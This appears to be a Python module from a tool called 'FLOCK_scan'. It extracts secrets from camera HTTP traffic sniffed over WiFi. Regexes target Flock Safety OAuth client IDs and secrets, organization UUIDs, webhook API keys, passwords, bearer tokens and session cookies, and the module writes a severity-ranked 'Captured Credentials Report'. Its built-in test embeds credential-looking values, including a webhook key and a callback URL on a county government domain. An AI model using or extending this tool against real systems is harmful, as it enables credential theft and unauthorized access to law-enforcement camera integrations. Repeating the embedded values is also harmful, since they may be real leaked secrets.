#!/usr/bin/env python3
"""
creds_extractor.py — Extract leaked M2M tokens, webhook API keys,
and auth configurations from camera HTTP traffic.

When a camera's admin page or config endpoints are captured over WiFi
(monitor mode), this module scans for:

  - OAuth2 client_id / client_secret pairs
  - Flock Safety M2M configuration
  - Webhook API keys (X-API-Key headers, callback URLs)
  - Auth0 / OIDC endpoints
  - Admin credentials
  - Any API keys in body text

Usage:
    from modules.creds_extractor import extract_creds, scan_for_creds
    found = extract_creds(body_text, source="admin_page")
    creds = scan_for_creds(http_responses_list)
"""

import re
import json
from datetime import datetime

# ═══════════════════════════════════════════════════════════════════
#  PATTERNS
# ═══════════════════════════════════════════════════════════════════

# M2M / OAuth2 credential patterns
M2M_CLIENT_ID = re.compile(
    r'(?:client_id|clientId|client-id)\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
    re.I
)
M2M_CLIENT_SECRET = re.compile(
    r'(?:client_secret|clientSecret|client-secret)\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
    re.I
)
M2M_PAIRED = re.compile(
    r'client_id["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\'][^;]*?client_secret["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
    re.I | re.DOTALL
)

# Flock-specific
FLOCK_AUDIENCE = re.compile(
    r'(?:audience|aud)\s*[:=]\s*["\'](com\.flocksafety\.[a-zA-Z.]+)["\']',
    re.I
)
FLOCK_ORG_ID = re.compile(
    r'(?:organization_id|orgId|organisation_id)\s*[:=]\s*["\']?([a-f0-9-]{36})["\']?',
    re.I
)
FLOCK_TOKEN_ENDPOINT = re.compile(
    r'https://api\.flocksafety\.com/oauth/token',
    re.I
)
FLOCK_WEBHOOK_API_KEY = re.compile(
    r'(?:X-API-Key|webhook_api_key|api_key)\s*[:=]\s*["\']([A-Z0-9_-]{20,})["\']',
    re.I
)

# Generic API keys
API_KEY_PATTERNS = [
    (re.compile(r'api[_-]?key\s*[:=]\s*["\']([A-Za-z0-9_\-=]{16,})["\']', re.I), "API_Key"),
    (re.compile(r'secret\s*[:=]\s*["\']([A-Za-z0-9_\-=]{16,})["\']', re.I), "Generic_Secret"),
    (re.compile(r'token\s*[:=]\s*["\']([A-Za-z0-9_\-\.]{20,})["\']', re.I), "Token"),
    (re.compile(r'password\s*[:=]\s*["\']([^"\']{6,})["\']', re.I), "Password"),
    (re.compile(r'passwd\s*[:=]\s*["\']([^"\']{6,})["\']', re.I), "Password"),
]

# Webhook URLs
WEBHOOK_URL = re.compile(
    r'https?://[a-zA-Z0-9.-]+/webhooks?/[a-zA-Z0-9_.-]+',
    re.I
)
CALLBACK_URL = re.compile(
    r'(?:callback_url|callbackUrl|redirect_uri|redirectUri)\s*[:=]\s*["\'](https?://[^"\']+)["\']',
    re.I
)

# Auth0 / OIDC endpoints
AUTH0_DOMAIN = re.compile(
    r'(?:login\.flocksafety\.com|flocksafety\.auth0\.com|auth0)',
    re.I
)

# Admin credentials (low-confidence — catches patterns)
ADMIN_CRED = re.compile(
    r'(?:admin|root|administrator)\s*[:=]\s*["\']\w+["\']\s*[:;,\n]\s*(?:pass|passwd|password)\s*[:=]\s*["\'][^"\']+["\']',
    re.I
)


# ═══════════════════════════════════════════════════════════════════
#  EXTRACTION FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

def extract_creds(body, source="unknown", headers=None):
    """
    Scan a body of text (HTTP response, config dump, etc.) for credentials.
    Returns a list of finding dicts.

    Args:
        body: String body to scan
        source: Label for where this came from (e.g. "admin_page", "config_endpoint")
        headers: Optional dict of HTTP headers from the same response

    Returns:
        List of dicts: [{type, value, context, source, confidence}]
    """
    findings = []
    if not body:
        return findings

    # ── M2M Paired (client_id + client_secret together) ──
    for m in M2M_PAIRED.finditer(body):
        findings.append({
            "type": "M2M_CREDENTIALS",
            "value": f"client_id={m.group(1)}, client_secret={m.group(2)}",
            "client_id": m.group(1),
            "client_secret": m.group(2),
            "source": source,
            "confidence": "HIGH" if FLOCK_TOKEN_ENDPOINT.search(body) else "MEDIUM",
            "context": body[max(0, m.start()-80):m.end()+80],
        })

    # ── Individual M2M client_ids ──
    for m in M2M_CLIENT_ID.finditer(body):
        # Skip if already captured in paired match
        if not any(f.get("client_id") == m.group(1) for f in findings if f.get("client_id")):
            findings.append({
                "type": "CLIENT_ID",
                "value": m.group(1),
                "source": source,
                "confidence": "MEDIUM" if AUTH0_DOMAIN.search(body) else "LOW",
                "context": body[max(0, m.start()-40):m.end()+40],
            })

    # ── Individual client secrets ──
    for m in M2M_CLIENT_SECRET.finditer(body):
        if not any(f.get("client_secret") == m.group(1) for f in findings if f.get("client_secret")):
            findings.append({
                "type": "CLIENT_SECRET",
                "value": m.group(1),
                "source": source,
                "confidence": "MEDIUM",
                "context": body[max(0, m.start()-40):m.end()+40],
            })

    # ── Flock M2M Audience ──
    for m in FLOCK_AUDIENCE.finditer(body):
        findings.append({
            "type": "M2M_AUDIENCE",
            "value": m.group(1),
            "source": source,
            "confidence": "HIGH",
        })

    # ── Flock Organization UUID ──
    for m in FLOCK_ORG_ID.finditer(body):
        findings.append({
            "type": "ORGANIZATION_UUID",
            "value": m.group(1),
            "source": source,
            "confidence": "HIGH",
        })

    # ── Webhook API keys ──
    for m in FLOCK_WEBHOOK_API_KEY.finditer(body):
        findings.append({
            "type": "WEBHOOK_API_KEY",
            "value": m.group(1),
            "source": source,
            "confidence": "HIGH" if "flock" in body.lower() else "MEDIUM",
            "context": body[max(0, m.start()-40):m.end()+40],
        })

    # ── Webhook URLs ──
    for m in WEBHOOK_URL.finditer(body):
        findings.append({
            "type": "WEBHOOK_URL",
            "value": m.group(0),
            "source": source,
            "confidence": "MEDIUM",
        })

    # ── Callback URLs ──
    for m in CALLBACK_URL.finditer(body):
        findings.append({
            "type": "CALLBACK_URL",
            "value": m.group(1),
            "source": source,
            "confidence": "HIGH",
        })

    # ── Generic API keys ──
    for pattern, label in API_KEY_PATTERNS:
        for m in pattern.finditer(body):
            # Skip short or obviously fake keys
            val = m.group(1)
            if len(val) < 8 or val in ("password", "password123", "admin"):
                continue
            findings.append({
                "type": label,
                "value": val,
                "source": source,
                "confidence": "LOW",
                "context": body[max(0, m.start()-30):m.end()+30][:100],
            })

    return findings


def extract_creds_from_headers(headers, source="unknown"):
    """Scan HTTP response headers for credential leaks."""
    findings = []
    if not headers:
        return findings

    h = {k.lower(): v for k, v in headers.items()}

    # X-API-Key
    for key in ("x-api-key", "x-api-key", "api-key", "authorization"):
        if key in h:
            val = h[key]
            if key == "authorization" and val.startswith("Bearer "):
                val = val[7:]
            findings.append({
                "type": "HEADER_API_KEY",
                "value": val,
                "header": key,
                "source": source,
                "confidence": "MEDIUM",
            })

    # Set-Cookie can leak session info
    if "set-cookie" in h:
        cookie = h["set-cookie"]
        # Check for session tokens
        if "session" in cookie.lower() or "token" in cookie.lower():
            findings.append({
                "type": "SESSION_COOKIE",
                "value": cookie[:200],
                "header": "Set-Cookie",
                "source": source,
                "confidence": "LOW",
            })

    return findings


def scan_responses(responses, output_file=None):
    """
    Scan a list of HTTP response data from captured traffic.
    Each response: {"url": str, "body": str, "headers": dict, "source": str}

    Returns deduplicated cred findings + optionally writes them to a doc.
    """
    all_findings = []
    seen_values = set()

    for resp in responses:
        findings = extract_creds(
            resp.get("body", ""),
            source=resp.get("source", resp.get("url", "unknown")),
            headers=resp.get("headers"),
        )
        findings += extract_creds_from_headers(
            resp.get("headers", {}),
            source=resp.get("source", resp.get("url", "unknown")),
        )

        for f in findings:
            dedup_key = f"{f['type']}:{f['value']}"
            if dedup_key not in seen_values:
                seen_values.add(dedup_key)
                all_findings.append(f)

    # Write to doc if output_file specified
    if output_file and all_findings:
        write_creds_report(all_findings, output_file)

    return all_findings


def write_creds_report(findings, output_path):
    """Write a human-readable credentials dump to a file."""
    timestamp = datetime.now().isoformat()

    with open(output_path, "w") as f:
        f.write("╔══════════════════════════════════════════════════════════════╗\n")
        f.write("║        FLOCK_scan — Captured Credentials Report            ║\n")
        f.write(f"║  Generated: {timestamp}                    ║\n")
        f.write("╚══════════════════════════════════════════════════════════════╝\n\n")

        # Group by type
        by_type = {}
        for finding in findings:
            t = finding["type"]
            if t not in by_type:
                by_type[t] = []
            by_type[t].append(finding)

        priority_order = [
            "M2M_CREDENTIALS", "CLIENT_ID", "CLIENT_SECRET", "M2M_AUDIENCE",
            "ORGANIZATION_UUID", "WEBHOOK_API_KEY", "WEBHOOK_URL",
            "CALLBACK_URL", "HEADER_API_KEY", "SESSION_COOKIE",
            "API_Key", "Generic_Secret", "Token", "Password",
        ]

        for ptype in priority_order:
            if ptype not in by_type:
                continue
            items = by_type[ptype]

            f.write(f"\n{'─' * 70}\n")
            severity = {
                "M2M_CREDENTIALS": "[CRIT] CRITICAL",
                "CLIENT_ID": "[HIGH] HIGH",
                "CLIENT_SECRET": "[CRIT] CRITICAL",
                "WEBHOOK_API_KEY": "[CRIT] CRITICAL",
                "ORGANIZATION_UUID": "[MED] MEDIUM",
                "CALLBACK_URL": "[MED] MEDIUM",
                "HEADER_API_KEY": "[MED] MEDIUM",
                "WEBHOOK_URL": "[LOW] LOW",
            }.get(ptype, "[INFO] INFO")

            f.write(f"  {severity}  {ptype}  ({len(items)} found)\n")
            f.write(f"{'─' * 70}\n")

            for item in items:
                f.write(f"\n  Value:    {item['value']}\n")
                f.write(f"  Source:   {item.get('source', 'unknown')}\n")
                f.write(f"  Conf:     {item.get('confidence', 'N/A')}\n")
                ctx = item.get("context", "")
                if ctx:
                    f.write(f"  Context:  {ctx[:200]}\n")
                f.write("\n")

        f.write(f"\n{'═' * 70}\n")
        f.write(f"Total findings: {len(findings)}\n")
        f.write(f"File: {output_path}\n")

    return len(findings)


def format_findings_terminal(findings, color=True):
    """Format findings for terminal display."""
    lines = []

    if not findings:
        return "  No credentials found."

    by_type = {}
    for f in findings:
        by_type.setdefault(f["type"], []).append(f)

    for ptype in ["M2M_CREDENTIALS", "CLIENT_ID", "CLIENT_SECRET",
                   "WEBHOOK_API_KEY", "ORGANIZATION_UUID", "CALLBACK_URL",
                   "WEBHOOK_URL", "HEADER_API_KEY"]:
        if ptype not in by_type:
            continue
        items = by_type[ptype]
        if color:
            label = {
                "M2M_CREDENTIALS": "\033[91m[M2M]\033[0m",
                "CLIENT_ID": "\033[93m[CLIENT_ID]\033[0m",
                "CLIENT_SECRET": "\033[91m[SECRET]\033[0m",
                "WEBHOOK_API_KEY": "\033[91m[WEBHOOK_KEY]\033[0m",
                "ORGANIZATION_UUID": "\033[93m[ORG_ID]\033[0m",
                "CALLBACK_URL": "\033[93m[CALLBACK]\033[0m",
                "WEBHOOK_URL": "\033[94m[WEBHOOK]\033[0m",
                "HEADER_API_KEY": "\033[93m[HEADER_KEY]\033[0m",
            }.get(ptype, f"[{ptype}]")
        else:
            label = f"[{ptype}]"

        for item in items:
            lines.append(f"  {label} {item['value'][:80]}")
            if item.get("context"):
                lines.append(f"         └─ {item['source']}")

    return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════
#  CLI TEST
# ═══════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    sample = """
    const config = {
        client_id: "CfDcZ19oi2zyujdBmSTr1f78rE8PcpaU",
        client_secret: "ml7YQ41K--MLHJn8SwEDVdUbF9Gga9NLKlf4BUvww2LlJnGYJuVS5YgMQYHMCX1L",
        audience: "com.flocksafety.integrations",
        organization_id: "39f42f24-393f-4a2e-bca2-0ce4cdf3fbf7",
        token_endpoint: "https://api.flocksafety.com/oauth/token",
        webhook_api_key: "BCSOREDFIVE-FLOCK-LPR-7f3a9e2d1c4b8056",
        callback_url: "https://redfive.berkeleycountysc.gov/webhooks/flock_webhook.php"
    };
    """

    findings = extract_creds(sample, source="sample_config")
    print("Terminal output:\n")
    print(format_findings_terminal(findings))
    print("\n\nWriting to creds_report.txt...")
    write_creds_report(findings, "/tmp/creds_test.txt")
    print(open("/tmp/creds_test.txt").read())
